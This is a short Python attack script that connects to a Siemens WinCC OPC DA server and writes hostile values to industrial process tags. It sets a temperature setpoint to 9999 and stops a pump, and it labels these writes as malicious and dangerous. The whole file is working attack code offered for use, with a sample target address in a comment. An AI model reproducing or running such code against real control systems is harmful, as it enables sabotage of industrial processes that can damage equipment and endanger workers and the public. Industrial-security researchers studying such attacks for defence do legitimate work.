def wincc_opc_write_attack(target_ip):
    """
    Write malicious values to WinCC tags via OPC DA
    """
    import win32com.client

    # Connect to WinCC OPC Server
    opc = win32com.client.Dispatch("OPC.Automation")

    try:
        # Connect to server
        opc_servers = opc.GetOPCServers(target_ip)
        print(f"[*] Available OPC servers: {opc_servers}")

        # Connect to WinCC server
        opc.Connect("OPCServer.WinCC.1", target_ip)
        print("[+] Connected to WinCC OPC Server")

        # Add group for write operations
        group = opc.OPCGroups.Add("AttackGroup")
        group.IsActive = True
        group.IsSubscribed = True

        # Add items (tags)
        item1 = group.OPCItems.AddItem("Process.Temperature_Setpoint", 1)
        item2 = group.OPCItems.AddItem("Process.Pump_Speed", 2)

        # Write malicious values
        item1.Write(9999)  # Dangerous temperature
        item2.Write(0)     # Stop pump

        print("[+] Malicious values written to OPC tags")

        opc.Disconnect()

    except Exception as e:
        print(f"[-] Attack failed: {e}")

# Requires Windows with OPC client libraries
# wincc_opc_write_attack('192.168.1.100')
